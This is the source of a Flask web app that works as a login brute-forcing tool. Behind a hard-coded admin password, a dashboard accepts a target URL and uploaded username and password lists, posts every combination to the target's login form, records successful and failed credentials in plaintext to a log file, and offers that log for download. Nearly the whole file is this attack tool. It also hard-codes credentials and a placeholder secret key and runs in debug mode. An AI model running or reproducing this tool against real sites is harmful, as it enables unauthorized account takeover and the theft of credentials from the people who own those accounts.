from flask import Flask, render_template, request, redirect, url_for, session, send_file
import requests
import datetime

app = Flask(__name__)
app.secret_key = "your_secret_key_here"

# Login credentials
USERNAME = "admin"
PASSWORD = "kader11000"

def log_attempt(username, password, status):
    with open("logs.txt", "a", encoding="utf-8") as f:
        time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{time}] {username}:{password} - {status}\n")

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username == USERNAME and password == PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        else:
            return render_template("login.html", error="Invalid login credentials.")
    return render_template("login.html")

@app.route("/dashboard", methods=["GET", "POST"])
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    results = []
    found = False
    if request.method == "POST":
        url = request.form["url"]
        keyword = request.form["keyword"]
        usernames_file = request.files["usernames"]
        passwords_file = request.files["passwords"]

        usernames = [line.strip().decode("utf-8") for line in usernames_file.readlines()]
        passwords = [line.strip().decode("utf-8") for line in passwords_file.readlines()]

        for username in usernames:
            for password in passwords:
                data = {"username": username, "password": password}
                try:
                    response = requests.post(url, data=data, timeout=5)
                    if keyword in response.text:
                        result = f"Success ({username}, {password})"
                        results.append(result)
                        log_attempt(username, password, "Success")
                        found = True
                        break
                    else:
                        results.append(f"Failed ({username}, {password})")
                        log_attempt(username, password, "Failed")
                except Exception as e:
                    results.append(f"Connection error: {str(e)}")
                    break
            if found:
                break
    return render_template("index.html", results=results)

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("login"))

@app.route("/logs")
def download_logs():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return send_file("logs.txt", as_attachment=True, download_name="logs.txt", mimetype="text/plain")

if __name__ == "__main__":
    app.run(debug=True)
